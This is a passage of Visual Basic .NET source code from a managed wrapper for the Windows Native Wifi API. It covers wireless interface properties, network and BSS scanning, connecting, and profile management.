                Public notifyData As Wlan.WlanNotificationData
                Public connNotifyData As Wlan.WlanConnectionNotificationData
            End Structure
            Private Structure WlanReasonNotificationData
                Public notifyData As Wlan.WlanNotificationData
                Public reasonCode As Wlan.WlanReasonCode
            End Structure
#End Region

            Friend Sub New(ByVal client As WlanClient, ByVal info As Wlan.WlanInterfaceInfo)
                Me.client = client
                Me.info = info
            End Sub

            ''' <summary>
            ''' Sets a parameter of the interface whose data type is <see cref="int"/>.
            ''' </summary>
            ''' <param name="opCode">The opcode of the parameter.</param>
            ''' <param name="value">The value to set.</param>
            Private Sub SetInterfaceInt(ByVal opCode As Wlan.WlanIntfOpcode, ByVal value As Integer)
                Dim valuePtr As IntPtr = Marshal.AllocHGlobal(4)
                Marshal.WriteInt32(valuePtr, value)
                Try
                    Wlan.ThrowIfError(Wlan.WlanSetInterface(client.clientHandle, info.interfaceGuid, opCode, 4, valuePtr, IntPtr.Zero))
                Finally
                    Marshal.FreeHGlobal(valuePtr)
                End Try
            End Sub

            ''' <summary>
            ''' Gets a parameter of the interface whose data type is <see cref="int"/>.
            ''' </summary>
            ''' <param name="opCode">The opcode of the parameter.</param>
            ''' <returns>The integer value.</returns>
            Private Function GetInterfaceInt(ByVal opCode As Wlan.WlanIntfOpcode) As Integer
                Dim valuePtr As IntPtr
                Dim valueSize As Integer
                Dim opcodeValueType As Wlan.WlanOpcodeValueType
                Wlan.ThrowIfError(Wlan.WlanQueryInterface(client.clientHandle, info.interfaceGuid, opCode, IntPtr.Zero, valueSize, valuePtr, _
                 opcodeValueType))
                Try
                    Return Marshal.ReadInt32(valuePtr)
                Finally
                    Wlan.WlanFreeMemory(valuePtr)
                End Try
            End Function

            ''' <summary>
            ''' Gets or sets a value indicating whether this <see cref="WlanInterface"/> is automatically configured.
            ''' </summary>
            ''' <value><c>true</c> if "autoconf" is enabled; otherwise, <c>false</c>.</value>
            Public Property Autoconf() As Boolean
                Get
                    Return GetInterfaceInt(Wlan.WlanIntfOpcode.AutoconfEnabled) <> 0
                End Get
                Set(ByVal value As Boolean)
                    SetInterfaceInt(Wlan.WlanIntfOpcode.AutoconfEnabled, If(value, 1, 0))
                End Set
            End Property

            ''' <summary>
            ''' Gets or sets the BSS type for the indicated interface.
            ''' </summary>
            ''' <value>The type of the BSS.</value>
            Public Property BssType() As Wlan.Dot11BssType
                Get
                    Return DirectCast(GetInterfaceInt(Wlan.WlanIntfOpcode.BssType), Wlan.Dot11BssType)
                End Get
                Set(ByVal value As Wlan.Dot11BssType)
                    SetInterfaceInt(Wlan.WlanIntfOpcode.BssType, CInt(value))
                End Set
            End Property

            ''' <summary>
            ''' Gets the state of the interface.
            ''' </summary>
            ''' <value>The state of the interface.</value>
            Public ReadOnly Property InterfaceState() As Wlan.WlanInterfaceState
                Get
                    Return DirectCast(GetInterfaceInt(Wlan.WlanIntfOpcode.InterfaceState), Wlan.WlanInterfaceState)
                End Get
            End Property

            ''' <summary>
            ''' Gets the channel.
            ''' </summary>
            ''' <value>The channel.</value>
            ''' <remarks>Not supported on Windows XP SP2.</remarks>
            Public ReadOnly Property Channel() As Integer
                Get
                    Return GetInterfaceInt(Wlan.WlanIntfOpcode.ChannelNumber)
                End Get
            End Property

            ''' <summary>
            ''' Gets the RSSI.
            ''' </summary>
            ''' <value>The RSSI.</value>
            ''' <remarks>Not supported on Windows XP SP2.</remarks>
            Public ReadOnly Property RSSI() As Integer
                Get
                    Return GetInterfaceInt(Wlan.WlanIntfOpcode.RSSI)
                End Get
            End Property
            ''' <summary>
            ''' Gets the attributes of the current connection.
            ''' </summary>
            ''' <value>The current connection attributes.</value>
            ''' <exception cref="Win32Exception">An exception with code 0x0000139F (The group or resource is not in the correct state to perform the requested operation.) will be thrown if the interface is not connected to a network.</exception>
            Public ReadOnly Property CurrentConnection() As Wlan.WlanConnectionAttributes
                Get
                    Dim valueSize As Integer
                    Dim valuePtr As IntPtr
                    Dim opcodeValueType As Wlan.WlanOpcodeValueType
                    Wlan.ThrowIfError(Wlan.WlanQueryInterface(client.clientHandle, info.interfaceGuid, Wlan.WlanIntfOpcode.CurrentConnection, IntPtr.Zero, valueSize, valuePtr, _
                     opcodeValueType))
                    Try
                        Return DirectCast(Marshal.PtrToStructure(valuePtr, GetType(Wlan.WlanConnectionAttributes)), Wlan.WlanConnectionAttributes)
                    Finally
                        Wlan.WlanFreeMemory(valuePtr)
                    End Try
                End Get
            End Property

            ''' <summary>
            ''' Requests a scan for available networks.
            ''' </summary>
            ''' <remarks>
            ''' The method returns immediately. Progress is reported through the <see cref="WlanNotification"/> event.
            ''' </remarks>
            Public Sub Scan()
                Wlan.ThrowIfError(Wlan.WlanScan(client.clientHandle, info.interfaceGuid, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero))
            End Sub

            ''' <summary>
            ''' Converts a pointer to a available networks list (header + entries) to an array of available network entries.
            ''' </summary>
            ''' <param name="bssListPtr">A pointer to an available networks list's header.</param>
            ''' <returns>An array of available network entries.</returns>
            Private Function ConvertAvailableNetworkListPtr(ByVal availNetListPtr As IntPtr) As Wlan.WlanAvailableNetwork()
                Dim availNetListHeader As Wlan.WlanAvailableNetworkListHeader = DirectCast(Marshal.PtrToStructure(availNetListPtr, GetType(Wlan.WlanAvailableNetworkListHeader)), Wlan.WlanAvailableNetworkListHeader)
                Dim availNetListIt As Long = availNetListPtr.ToInt64() + Marshal.SizeOf(GetType(Wlan.WlanAvailableNetworkListHeader))
                Dim availNets As Wlan.WlanAvailableNetwork() = New Wlan.WlanAvailableNetwork(availNetListHeader.numberOfItems - 1) {}
                For i As Integer = 0 To availNetListHeader.numberOfItems - 1
                    availNets(i) = DirectCast(Marshal.PtrToStructure(New IntPtr(availNetListIt), GetType(Wlan.WlanAvailableNetwork)), Wlan.WlanAvailableNetwork)
                    availNetListIt += Marshal.SizeOf(GetType(Wlan.WlanAvailableNetwork))
                Next
                Return availNets
            End Function

            ''' <summary>
            ''' Retrieves the list of available networks.
            ''' </summary>
            ''' <param name="flags">Controls the type of networks returned.</param>
            ''' <returns>A list of the available networks.</returns>
            Public Function GetAvailableNetworkList(ByVal flags As Wlan.WlanGetAvailableNetworkFlags) As Wlan.WlanAvailableNetwork()
                Dim availNetListPtr As IntPtr
                Wlan.ThrowIfError(Wlan.WlanGetAvailableNetworkList(client.clientHandle, info.interfaceGuid, flags, IntPtr.Zero, availNetListPtr))
                Try
                    Return ConvertAvailableNetworkListPtr(availNetListPtr)
                Finally
                    Wlan.WlanFreeMemory(availNetListPtr)
                End Try
            End Function

            ''' <summary>
            ''' Converts a pointer to a BSS list (header + entries) to an array of BSS entries.
            ''' </summary>
            ''' <param name="bssListPtr">A pointer to a BSS list's header.</param>
            ''' <returns>An array of BSS entries.</returns>
            Private Function ConvertBssListPtr(ByVal bssListPtr As IntPtr) As Wlan.WlanBssEntry()
                Dim bssListHeader As Wlan.WlanBssListHeader = DirectCast(Marshal.PtrToStructure(bssListPtr, GetType(Wlan.WlanBssListHeader)), Wlan.WlanBssListHeader)
                Dim bssListIt As Long = bssListPtr.ToInt64() + Marshal.SizeOf(GetType(Wlan.WlanBssListHeader))
                Dim bssEntries As Wlan.WlanBssEntry() = New Wlan.WlanBssEntry(bssListHeader.numberOfItems - 1) {}
                For i As Integer = 0 To bssListHeader.numberOfItems - 1
                    bssEntries(i) = DirectCast(Marshal.PtrToStructure(New IntPtr(bssListIt), GetType(Wlan.WlanBssEntry)), Wlan.WlanBssEntry)
                    bssListIt += Marshal.SizeOf(GetType(Wlan.WlanBssEntry))
                Next
                Return bssEntries
            End Function

            ''' <summary>
            ''' Retrieves the basic service sets (BSS) list of all available networks.
            ''' </summary>
            Public Function GetNetworkBssList() As Wlan.WlanBssEntry()
                Dim bssListPtr As IntPtr
                Wlan.ThrowIfError(Wlan.WlanGetNetworkBssList(client.clientHandle, info.interfaceGuid, IntPtr.Zero, Wlan.Dot11BssType.Any, False, IntPtr.Zero, _
                 bssListPtr))
                Try
                    Return ConvertBssListPtr(bssListPtr)
                Finally
                    Wlan.WlanFreeMemory(bssListPtr)
                End Try
            End Function

            ''' <summary>
            ''' Retrieves the basic service sets (BSS) list of the specified network.
            ''' </summary>
            ''' <param name="ssid">Specifies the SSID of the network from which the BSS list is requested.</param>
            ''' <param name="bssType">Indicates the BSS type of the network.</param>
            ''' <param name="securityEnabled">Indicates whether security is enabled on the network.</param>
            Public Function GetNetworkBssList(ByVal ssid As Wlan.Dot11Ssid, ByVal bssType As Wlan.Dot11BssType, ByVal securityEnabled As Boolean) As Wlan.WlanBssEntry()
                Dim ssidPtr As IntPtr = Marshal.AllocHGlobal(Marshal.SizeOf(ssid))
                Marshal.StructureToPtr(ssid, ssidPtr, False)
                Try
                    Dim bssListPtr As IntPtr
                    Wlan.ThrowIfError(Wlan.WlanGetNetworkBssList(client.clientHandle, info.interfaceGuid, ssidPtr, bssType, securityEnabled, IntPtr.Zero, _
                     bssListPtr))
                    Try
                        Return ConvertBssListPtr(bssListPtr)
                    Finally
                        Wlan.WlanFreeMemory(bssListPtr)
                    End Try
                Finally
                    Marshal.FreeHGlobal(ssidPtr)
                End Try
            End Function

            ''' <summary>
            ''' Connects to a network defined by a connection parameters structure.
            ''' </summary>
            ''' <param name="connectionParams">The connection paramters.</param>
            Protected Sub Connect(ByVal connectionParams As Wlan.WlanConnectionParameters)
                Wlan.ThrowIfError(Wlan.WlanConnect(client.clientHandle, info.interfaceGuid, connectionParams, IntPtr.Zero))
            End Sub

            ''' <summary>
            ''' Requests a connection (association) to the specified wireless network.
            ''' </summary>
            ''' <remarks>
            ''' The method returns immediately. Progress is reported through the <see cref="WlanNotification"/> event.
            ''' </remarks>
            Public Sub Connect(ByVal connectionMode As Wlan.WlanConnectionMode, ByVal bssType As Wlan.Dot11BssType, ByVal profile As String)
                Dim connectionParams As New Wlan.WlanConnectionParameters()
                connectionParams.wlanConnectionMode = connectionMode
                connectionParams.profile = profile
                connectionParams.dot11BssType = bssType
                connectionParams.flags = 0
                Connect(connectionParams)
            End Sub

            ''' <summary>
            ''' Connects (associates) to the specified wireless network, returning either on a success to connect
            ''' or a failure.
            ''' </summary>
            ''' <param name="connectionMode"></param>
            ''' <param name="bssType"></param>
            ''' <param name="profile"></param>
            ''' <param name="connectTimeout"></param>
            ''' <returns></returns>
            Public Function ConnectSynchronously(ByVal connectionMode As Wlan.WlanConnectionMode, ByVal bssType As Wlan.Dot11BssType, ByVal profile As String, ByVal connectTimeout As Integer) As Boolean
                queueEvents = True
                Try
                    Connect(connectionMode, bssType, profile)
                    While queueEvents AndAlso eventQueueFilled.WaitOne(connectTimeout, True)
                        SyncLock eventQueue
                            While eventQueue.Count <> 0
                                Dim e As Object = eventQueue.Dequeue()
                                If TypeOf e Is WlanConnectionNotificationEventData Then
                                    Dim wlanConnectionData As WlanConnectionNotificationEventData = CType(e, WlanConnectionNotificationEventData)
                                    ' Check if the conditions are good to indicate either success or failure.
                                    If wlanConnectionData.notifyData.notificationSource = Wlan.WlanNotificationSource.ACM Then
                                        Select Case DirectCast(wlanConnectionData.notifyData.NotificationCode, Wlan.WlanNotificationCodeAcm)
                                            Case Wlan.WlanNotificationCodeAcm.ConnectionComplete
                                                If wlanConnectionData.connNotifyData.profileName = profile Then
                                                    Return True
                                                End If
                                                Exit Select
                                        End Select
                                    End If
                                    Exit While
                                End If
                            End While
                        End SyncLock
                    End While
                Finally
                    queueEvents = False
                    eventQueue.Clear()
                End Try
                Return False
                ' timeout expired and no "connection complete"
            End Function

            ''' <summary>
            ''' Connects to the specified wireless network.
            ''' </summary>
            ''' <remarks>
            ''' The method returns immediately. Progress is reported through the <see cref="WlanNotification"/> event.
            ''' </remarks>
            Public Sub Connect(ByVal connectionMode As Wlan.WlanConnectionMode, ByVal bssType As Wlan.Dot11BssType, ByVal ssid As Wlan.Dot11Ssid, ByVal flags As Wlan.WlanConnectionFlags)
                Dim connectionParams As New Wlan.WlanConnectionParameters()
                connectionParams.wlanConnectionMode = connectionMode
                connectionParams.dot11SsidPtr = Marshal.AllocHGlobal(Marshal.SizeOf(ssid))
                Marshal.StructureToPtr(ssid, connectionParams.dot11SsidPtr, False)
                connectionParams.dot11BssType = bssType
                connectionParams.flags = flags
                Connect(connectionParams)
                Marshal.DestroyStructure(connectionParams.dot11SsidPtr, ssid.[GetType]())
                Marshal.FreeHGlobal(connectionParams.dot11SsidPtr)
            End Sub

            ''' <summary>
            ''' Deletes a profile.
            ''' </summary>
            ''' <param name="profileName">
            ''' The name of the profile to be deleted. Profile names are case-sensitive.
            ''' On Windows XP SP2, the supplied name must match the profile name derived automatically from the SSID of the network. For an infrastructure network profile, the SSID must be supplied for the profile name. For an ad hoc network profile, the supplied name must be the SSID of the ad hoc network followed by <c>-adhoc</c>.
            ''' </param>
            Public Sub DeleteProfile(ByVal profileName As String)
                Wlan.ThrowIfError(Wlan.WlanDeleteProfile(client.clientHandle, info.interfaceGuid, profileName, IntPtr.Zero))
            End Sub

            ''' <summary>
            ''' Sets the profile.
            ''' </summary>
            ''' <param name="flags">The flags to set on the profile.</param>
            ''' <param name="profileXml">The XML representation of the profile. On Windows XP SP 2, special care should be taken to adhere to its limitations.</param>
            ''' <param name="overwrite">If a profile by the given name already exists, then specifies whether to overwrite it (if <c>true</c>) or return an error (if <c>false</c>).</param>
            ''' <returns>The resulting code indicating a success or the reason why the profile wasn't valid.</returns>
            Public Function SetProfile(ByVal flags As Wlan.WlanProfileFlags, ByVal profileXml As String, ByVal overwrite As Boolean) As Wlan.WlanReasonCode
                Dim reasonCode As Wlan.WlanReasonCode
                Wlan.ThrowIfError(Wlan.WlanSetProfile(client.clientHandle, info.interfaceGuid, flags, profileXml, Nothing, overwrite, _
                 IntPtr.Zero, reasonCode))
                Return reasonCode
            End Function

            ''' <summary>
            ''' Gets the profile's XML specification.
            ''' </summary>
            ''' <param name="profileName">The name of the profile.</param>
            ''' <returns>The XML document.</returns>
            Public Function GetProfileXml(ByVal profileName As String) As String
                Dim profileXmlPtr As IntPtr
                Dim flags As Wlan.WlanProfileFlags
                Dim access As Wlan.WlanAccess
                Wlan.ThrowIfError(Wlan.WlanGetProfile(client.clientHandle, info.interfaceGuid, profileName, IntPtr.Zero, profileXmlPtr, flags, _
                 access))
                Try
                    Return Marshal.PtrToStringUni(profileXmlPtr)
                Finally
                    Wlan.WlanFreeMemory(profileXmlPtr)
                End Try
            End Function

            ''' <summary>
            ''' Gets the information of all profiles on this interface.
            ''' </summary>
            ''' <returns>The profiles information.</returns>
            Public Function GetProfiles() As Wlan.WlanProfileInfo()
                Dim profileListPtr As IntPtr
                Wlan.ThrowIfError(Wlan.WlanGetProfileList(client.clientHandle, info.interfaceGuid, IntPtr.Zero, profileListPtr))
                Try
                    Dim header As Wlan.WlanProfileInfoListHeader = DirectCast(Marshal.PtrToStructure(profileListPtr, GetType(Wlan.WlanProfileInfoListHeader)), Wlan.WlanProfileInfoListHeader)
                    Dim profileInfos As Wlan.WlanProfileInfo() = New Wlan.WlanProfileInfo(header.numberOfItems - 1) {}
                    Dim profileListIterator As Long = profileListPtr.ToInt64() + Marshal.SizeOf(header)
                    For i As Integer = 0 To header.numberOfItems - 1
                        Dim profileInfo As Wlan.WlanProfileInfo = DirectCast(Marshal.PtrToStructure(New IntPtr(profileListIterator), GetType(Wlan.WlanProfileInfo)), Wlan.WlanProfileInfo)
                        profileInfos(i) = profileInfo
                        profileListIterator += Marshal.SizeOf(profileInfo)
                    Next
                    Return profileInfos
                Finally
                    Wlan.WlanFreeMemory(profileListPtr)
                End Try
            End Function

            Friend Sub OnWlanConnection(ByVal notifyData As Wlan.WlanNotificationData, ByVal connNotifyData As Wlan.WlanConnectionNotificationData)
                RaiseEvent WlanConnectionNotification(notifyData, connNotifyData)

                If queueEvents Then
                    Dim queuedEvent As New WlanConnectionNotificationEventData()
                    queuedEvent.notifyData = notifyData
                    queuedEvent.connNotifyData = connNotifyData
                    EnqueueEvent(queuedEvent)
                End If
            End Sub

            Friend Sub OnWlanReason(ByVal notifyData As Wlan.WlanNotificationData, ByVal reasonCode As Wlan.WlanReasonCode)
                RaiseEvent WlanReasonNotification(notifyData, reasonCode)
                If queueEvents Then
                    Dim queuedEvent As New WlanReasonNotificationData()
                    queuedEvent.notifyData = notifyData
                    queuedEvent.reasonCode = reasonCode
                    EnqueueEvent(queuedEvent)
                End If
            End Sub

            Friend Sub OnWlanNotification(ByVal notifyData As Wlan.WlanNotificationData)
                RaiseEvent WlanNotification(notifyData)
            End Sub

            ''' <summary>
            ''' Enqueues a notification event to be processed serially.
            ''' </summary>
            Private Sub EnqueueEvent(ByVal queuedEvent As Object)
                SyncLock eventQueue
                    eventQueue.Enqueue(queuedEvent)
                End SyncLock
                eventQueueFilled.[Set]()
            End Sub

            ''' <summary>
            ''' Gets the network interface of this wireless interface.
            ''' </summary>
            ''' <remarks>
            ''' The network interface allows querying of generic network properties such as the interface's IP address.
            ''' </remarks>
            Public ReadOnly Property NetworkInterface() As NetworkInterface
                Get
                    ' Do not cache the NetworkInterface; We need it fresh
                    ' each time cause otherwise it caches the IP information.
                    For Each netIface As NetworkInterface In NetworkInterface.GetAllNetworkInterfaces()
                        Dim netIfaceGuid As New Guid(netIface.Id)
                        If netIfaceGuid.Equals(info.interfaceGuid) Then
                            Return netIface
                        End If
                    Next
                    Return Nothing
                End Get
            End Property

            ''' <summary>
            ''' The GUID of the interface (same content as the <see cref="System.Net.NetworkInformation.NetworkInterface.Id"/> value).
            ''' </summary>
            Public ReadOnly Property InterfaceGuid() As Guid
                Get
                    Return info.interfaceGuid
                End Get
            End Property

            ''' <summary>
            ''' The description of the interface.
            ''' This is a user-immutable string containing the vendor and model name of the adapter.
            ''' </summary>
            Public ReadOnly Property InterfaceDescription() As String
                Get
                    Return info.interfaceDescription
                End Get
            End Property

            ''' <summary>
            ''' The friendly name given to the interface by the user (e.g. "Local Area Network Connection").
            ''' </summary>
            Public ReadOnly Property InterfaceName() As String
                Get
                    Return NetworkInterface.Name
                End Get
            End Property
        End Class

        Private clientHandle As IntPtr
        Private negotiatedVersion As UInteger
        Private wlanNotificationCallback As Wlan.WlanNotificationCallbackDelegate

        Private ifaces As New Dictionary(Of Guid, WlanInterface)()

        Public Sub New()
            Wlan.ThrowIfError(Wlan.WlanOpenHandle(Wlan.WLAN_CLIENT_VERSION_XP_SP2, IntPtr.Zero, negotiatedVersion, clientHandle))
            Try
                Dim prevSrc As Wlan.WlanNotificationSource
                wlanNotificationCallback = New Wlan.WlanNotificationCallbackDelegate(AddressOf OnWlanNotification)
                Wlan.ThrowIfError(Wlan.WlanRegisterNotification(clientHandle, Wlan.WlanNotificationSource.All, False, wlanNotificationCallback, IntPtr.Zero, IntPtr.Zero, _
                 prevSrc))
            Catch
                Wlan.WlanCloseHandle(clientHandle, IntPtr.Zero)
                Throw
            End Try
        End Sub

        Protected Overrides Sub Finalize()
            Try
                Wlan.WlanCloseHandle(clientHandle, IntPtr.Zero)
            Finally
                MyBase.Finalize()
            End Try
        End Sub

        Private Function ParseWlanConnectionNotification(ByRef notifyData As Wlan.WlanNotificationData) As System.Nullable(Of Wlan.WlanConnectionNotificationData)
            Dim expectedSize As Integer = Marshal.SizeOf(GetType(Wlan.WlanConnectionNotificationData))
            If notifyData.dataSize < expectedSize Then
                Return Nothing
            End If

            Dim connNotifyData As Wlan.WlanConnectionNotificationData = DirectCast(Marshal.PtrToStructure(notifyData.dataPtr, GetType(Wlan.WlanConnectionNotificationData)), Wlan.WlanConnectionNotificationData)
            If connNotifyData.wlanReasonCode = Wlan.WlanReasonCode.Success Then
                Dim profileXmlPtr As New IntPtr(notifyData.dataPtr.ToInt64() + Marshal.OffsetOf(GetType(Wlan.WlanConnectionNotificationData), "profileXml").ToInt64())
                connNotifyData.profileXml = Marshal.PtrToStringUni(profileXmlPtr)
            End If
            Return connNotifyData
        End Function

        Private Sub OnWlanNotification(ByRef notifyData As Wlan.WlanNotificationData, ByVal context As IntPtr)
            Dim wlanIface As WlanInterface = If(ifaces.ContainsKey(notifyData.interfaceGuid), ifaces(notifyData.interfaceGuid), Nothing)

            Select Case notifyData.notificationSource
                Case Wlan.WlanNotificationSource.ACM
                    Select Case DirectCast(notifyData.NotificationCode, Wlan.WlanNotificationCodeAcm)
                        Case Wlan.WlanNotificationCodeAcm.ConnectionStart, Wlan.WlanNotificationCodeAcm.ConnectionComplete, Wlan.WlanNotificationCodeAcm.ConnectionAttemptFail, Wlan.WlanNotificationCodeAcm.Disconnecting, Wlan.WlanNotificationCodeAcm.Disconnected
                            Dim connNotifyData As System.Nullable(Of Wlan.WlanConnectionNotificationData) = ParseWlanConnectionNotification(notifyData)
                            If connNotifyData.HasValue Then
                                If wlanIface IsNot Nothing Then
                                    wlanIface.OnWlanConnection(notifyData, connNotifyData.Value)
                                End If
                            End If
                            Exit Select
                        Case Wlan.WlanNotificationCodeAcm.ScanFail
                            If True Then

                            End If
                            Exit Select
                    End Select
                    Exit Select
                Case Wlan.WlanNotificationSource.MSM
                    Select Case DirectCast(notifyData.NotificationCode, Wlan.WlanNotificationCodeMsm)
                        Case Wlan.WlanNotificationCodeMsm.Associating, Wlan.WlanNotificationCodeMsm.Associated, Wlan.WlanNotificationCodeMsm.Authenticating, Wlan.WlanNotificationCodeMsm.Connected, Wlan.WlanNotificationCodeMsm.RoamingStart, Wlan.WlanNotificationCodeMsm.RoamingEnd, _
                         Wlan.WlanNotificationCodeMsm.Disassociating, Wlan.WlanNotificationCodeMsm.Disconnected, Wlan.WlanNotificationCodeMsm.PeerJoin, Wlan.WlanNotificationCodeMsm.PeerLeave, Wlan.WlanNotificationCodeMsm.AdapterRemoval
                            Dim connNotifyData As System.Nullable(Of Wlan.WlanConnectionNotificationData) = ParseWlanConnectionNotification(notifyData)
                            If connNotifyData.HasValue Then
                                If wlanIface IsNot Nothing Then
                                    wlanIface.OnWlanConnection(notifyData, connNotifyData.Value)
                                End If
                            End If
                            Exit Select
                    End Select
                    Exit Select
            End Select

            If wlanIface IsNot Nothing Then
                wlanIface.OnWlanNotification(notifyData)
            End If
        End Sub

        Public ReadOnly Property Interfaces() As WlanInterface()
            Get
                Dim ifaceList As IntPtr
                Wlan.ThrowIfError(Wlan.WlanEnumInterfaces(clientHandle, IntPtr.Zero, ifaceList))
                Try
                    Dim header As Wlan.WlanInterfaceInfoListHeader = DirectCast(Marshal.PtrToStructure(ifaceList, GetType(Wlan.WlanInterfaceInfoListHeader)), Wlan.WlanInterfaceInfoListHeader)
                    Dim listIterator As Int64 = ifaceList.ToInt64() + Marshal.SizeOf(header)
                    Dim interfaces__1 As WlanInterface() = New WlanInterface(header.numberOfItems - 1) {}
                    Dim currentIfaceGuids As New List(Of Guid)()
                    For i As Integer = 0 To header.numberOfItems - 1
                        Dim info As Wlan.WlanInterfaceInfo = DirectCast(Marshal.PtrToStructure(New IntPtr(listIterator), GetType(Wlan.WlanInterfaceInfo)), Wlan.WlanInterfaceInfo)
                        listIterator += Marshal.SizeOf(info)
                        Dim wlanIface As WlanInterface
                        currentIfaceGuids.Add(info.interfaceGuid)
                        If ifaces.ContainsKey(info.interfaceGuid) Then
                            wlanIface = ifaces(info.interfaceGuid)
                        Else
                            wlanIface = New WlanInterface(Me, info)
                        End If
                        interfaces__1(i) = wlanIface
                        ifaces(info.interfaceGuid) = wlanIface
                    Next


                    Dim deadIfacesGuids As New Queue(Of Guid)()
                    For Each ifaceGuid As Guid In ifaces.Keys
                        If Not currentIfaceGuids.Contains(ifaceGuid) Then
                            deadIfacesGuids.Enqueue(ifaceGuid)
                        End If
                    Next
                    While deadIfacesGuids.Count <> 0
                        Dim deadIfaceGuid As Guid = deadIfacesGuids.Dequeue()
                        ifaces.Remove(deadIfaceGuid)
                    End While

                    Return interfaces__1
                Finally
                    Wlan.WlanFreeMemory(ifaceList)
                End Try
            End Get
        End Property

        Public Function GetStringForReasonCode(ByVal reasonCode As Wlan.WlanReasonCode) As String
            Dim sb As New StringBuilder(1024)
            Wlan.ThrowIfError(Wlan.WlanReasonCodeToString(reasonCode, sb.Capacity, sb, IntPtr.Zero))
            Return sb.ToString()
        End Function
    End Class
End Namespace
